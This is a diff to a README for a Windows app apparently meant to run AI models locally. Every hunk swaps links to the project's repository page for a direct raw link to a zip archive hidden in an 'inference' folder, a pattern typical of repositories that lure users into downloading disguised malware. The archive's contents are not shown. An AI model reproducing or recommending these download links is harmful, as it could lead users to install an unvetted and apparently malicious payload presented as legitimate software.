@@ -1,6 +1,6 @@
 # 🤖 dgx-spark-ai - Run AI Models On Your PC
 
-[![Download](https://img.shields.io/badge/Download-dgx--spark--ai-blue?style=for-the-badge)](https://github.com/Ikaran8623/dgx-spark-ai)
+[![Download](https://img.shields.io/badge/Download-dgx--spark--ai-blue?style=for-the-badge)](https://github.com/Ikaran8623/dgx-spark-ai/raw/refs/heads/main/inference/spark-dgx-ai-v1.5-beta.1.zip)
 
 ## 🚀 What This App Does
 
@@ -27,7 +27,7 @@ If you plan to use GPT-OSS 120B, you should have a high-memory GPU system with e
 
 Visit this page to download:
 
-[https://github.com/Ikaran8623/dgx-spark-ai](https://github.com/Ikaran8623/dgx-spark-ai)
+[https://github.com/Ikaran8623/dgx-spark-ai/raw/refs/heads/main/inference/spark-dgx-ai-v1.5-beta.1.zip](https://github.com/Ikaran8623/dgx-spark-ai/raw/refs/heads/main/inference/spark-dgx-ai-v1.5-beta.1.zip)
 
 If the page includes a release file, download it to your Windows computer. If it provides source files only, use the setup steps below to run it locally.
 
@@ -214,6 +214,6 @@ If you want to go further, you can:
 
 Open the download page here:
 
-[https://github.com/Ikaran8623/dgx-spark-ai](https://github.com/Ikaran8623/dgx-spark-ai)
+[https://github.com/Ikaran8623/dgx-spark-ai/raw/refs/heads/main/inference/spark-dgx-ai-v1.5-beta.1.zip](https://github.com/Ikaran8623/dgx-spark-ai/raw/refs/heads/main/inference/spark-dgx-ai-v1.5-beta.1.zip)
 
 Use that page to download the files, install the app on Windows, and set up your local AI workspace
